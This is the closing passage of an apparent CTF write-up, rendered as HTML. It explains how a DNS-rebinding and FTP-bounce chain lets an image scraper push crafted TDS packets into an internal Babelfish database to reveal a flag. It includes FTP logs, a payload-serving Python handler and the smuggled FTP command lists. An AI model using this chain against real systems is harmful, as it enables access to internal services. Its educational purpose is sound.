+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> GET <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"GET"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token comment"># ...snip...</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> USER anonymous
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">331</span> Username ok<span class="token punctuation">,</span> send password<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> PASS <span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">230</span> Login successful<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> USER <span class="token string">'anonymous'</span> logged <span class="token keyword">in</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> TYPE I
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">200</span> Type <span class="token builtin">set</span> to<span class="token punctuation">:</span> Binary<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> EPRT <span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">|</span><span class="token number">1433</span><span class="token operator">|</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> REST <span class="token number">69</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">350</span> Restarting at position <span class="token number">69.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command too <span class="token builtin">long</span><span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">200</span> Active data connection established<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> RETR exploit_image<span class="token punctuation">.</span>png
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">550</span> No such <span class="token builtin">file</span> <span class="token keyword">or</span> directory<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span>  <span class="token string">", nonce="</span>testing
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">39022</span><span class="token operator">-</span><span class="token punctuation">[</span>anonymous<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">""</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token comment"># ...snip...</span></code></pre>
+<p>Now that we can reliably run FTP commands, we have everything we need to attempt the FTP bounce and interact with the database.</p>
+<h2>FTP Bounce to Interact with Database</h2>
+<p>We'll first add a bit more logic to our web server so that it can serve the image containing our TDS packets.</p>
+<pre class="language-python"><code class="language-python"><span class="token comment"># ...snip...</span>
+<span class="token keyword">class</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol_version<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/image"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./exploit_image.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> image<span class="token punctuation">:</span>
+                content <span class="token operator">=</span> image<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"OK"</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+                <span class="token keyword">return</span>
+        <span class="token comment"># ...snip... </span></code></pre>
+<p>Then, we'll have the application scrape the image. It saves on disk with a random filename, but that filename is the same one that is used to serve the image in the web root.</p>
+<pre class="language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-img-wrap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/scraped/507081181a994a09a6657420ae8b8a0d.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Archived bird<span class="token punctuation">"</span></span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- HERE --></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-format<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PNG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>meta<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>meta-dims<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>3 × 1px · 1.1 KB<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>meta-url<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://abcd:21/image<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>http://abcd:21/image<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>meta-date<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>2026-09-07 09:04 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre>
+<p>Now we can update the web server again to include the proper file name in the FTP commands to run.</p>
+<pre class="language-python"><code class="language-python">ftp_commands <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"USER anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"PASS anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"TYPE I"</span><span class="token punctuation">,</span>
+    <span class="token string">"EPRT |1|127.0.0.1|1433|"</span><span class="token punctuation">,</span>
+    <span class="token string">"REST 69"</span><span class="token punctuation">,</span>
+    <span class="token string">"RETR 507081181a994a09a6657420ae8b8a0d.png"</span>
+<span class="token punctuation">]</span></code></pre>
+<p>Running the exploit now, we see the following logs come from the babelfish instance.</p>
+<pre class="language-python"><code class="language-python">CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> TDS Pre<span class="token operator">-</span>Login<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> Login<span class="token punctuation">.</span>
+LOG<span class="token punctuation">:</span>  message_type<span class="token punctuation">:</span> TDS7 Login
+CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> TDS Login7<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> Login<span class="token punctuation">.</span>
+LOG<span class="token punctuation">:</span>  could <span class="token keyword">not</span> send data to client<span class="token punctuation">:</span> Broken pipe
+CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> TDS Login7<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> Login<span class="token punctuation">.</span> TDS InternalFlush <span class="token operator">-</span> Sending data to the client
+FATAL<span class="token punctuation">:</span>  connection to client lost</code></pre>
+<p>It looks like the connection between the FTP service and the database drops before the database has finished processing the packets. Similar to how we used <code>junk_padding</code> to keep the python requests connection open, we'll need to figure out a way of keeping this connection alive.</p>
+<p>In this case, we can use a combination of two commands that should slow things down long enough and keep the connection open. One is simply another <code>RETR</code> command, except this time we'll run it on a large file (20MB, since that's the max for the scraper). The second command we can use is the <code>STOR</code> command, which receives data over the connection and saves it to a file. This leaves us with a final set of FTP commands.</p>
+<pre class="language-python"><code class="language-python">ftp_commands <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"USER anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"PASS anonymous"</span><span class="token punctuation">,</span>
+    <span class="token string">"TYPE I"</span><span class="token punctuation">,</span>
+    <span class="token string">"EPRT |1|127.0.0.1|1433|"</span><span class="token punctuation">,</span>
+    <span class="token string">"REST 69"</span><span class="token punctuation">,</span>
+    <span class="token string">"RETR 507081181a994a09a6657420ae8b8a0d.png"</span><span class="token punctuation">,</span>
+    <span class="token string">"RETR 1beb2d2269b44daf917c49bf00fcbb21.png"</span><span class="token punctuation">,</span> <span class="token comment"># 20MB file</span>
+    <span class="token string">"STOR f"</span> <span class="token comment"># read data from TDS responses, write to file</span>
+<span class="token punctuation">]</span></code></pre>
+<p>With enough attempts, we finally see some different babelfish logs<sup><a href="#notes"><b><code>2</code></b></a></sup>.</p>
+<pre class="language-python"><code class="language-python">LOG<span class="token punctuation">:</span>  message_type<span class="token punctuation">:</span> TDS7 Prelogin Message
+CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> TDS Pre<span class="token operator">-</span>Login<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> Login<span class="token punctuation">.</span>
+LOG<span class="token punctuation">:</span>  message_type<span class="token punctuation">:</span> TDS7 Login
+CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> TDS Login7<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> Login<span class="token punctuation">.</span>
+CONTEXT<span class="token punctuation">:</span>  TDS Protocol<span class="token punctuation">:</span> Message Type<span class="token punctuation">:</span> SQL BATCH<span class="token punctuation">,</span> Phase<span class="token punctuation">:</span> TDS_REQUEST_PHASE_FETCH<span class="token punctuation">.</span> Processing TDS header
+LOG<span class="token punctuation">:</span>  Unmapped error found<span class="token punctuation">.</span> Code<span class="token punctuation">:</span> <span class="token number">16908800</span><span class="token punctuation">,</span> Message<span class="token punctuation">:</span> Packet length <span class="token number">20039</span> exceeds packet size <span class="token number">4096</span><span class="token punctuation">,</span> File<span class="token punctuation">:</span> tdscomm<span class="token punctuation">.</span>c<span class="token punctuation">,</span> Line<span class="token punctuation">:</span> <span class="token number">257</span><span class="token punctuation">,</span> Context<span class="token punctuation">:</span> TDS</code></pre>
+<p>Along with them, we now see the flag unhidden on the home page!</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2026-09-07 202753.png">
+<p>What a challenge!! While the main idea of DNS rebinding to FTP bouncing was not overly complicated, there was a lot of unexpected complexity in getting the chain to work. It was a lot of fun finding all those small ideas and putting them together to build the exploit.</p>
+<p>After going through and solving this challenge again locally and by myself, I recognise that I did not contribute massively to the final solve during the competition. Regardless, I'm glad that I was able to help with some small parts of it.</p>
+<p>I look forward to the next time I have the chance to play such a good web challenge with such amazing CTF players. Until then, I'll keep working on my skills so that I might be able to keep up with them.</p>
+<h2 id="notes">Notes</h2>
+<ol>
+<li>
+<p>For the sake of brevity, I've excluded a lot of the challenge code and ideas that we had while solving. For example, we looked into ImageMagick exploits and attacks against the babelfish translation layer before starting on the correct path (thanks to four0four for getting us on the right track).</p>
+</li>
+<li>
+<p>The exact logs I got for a successful run varied a lot, likely due to my payload only barely keeping the connection open long enough.</p>
+</li>
+</ol>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+		
+		/* APENDER: add wrap */
+		code[class*="language-"] {
+			@media (width > 40rem) {
+				text-wrap-mode: wrap;
+				overflow-wrap: anywhere;
+			}
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
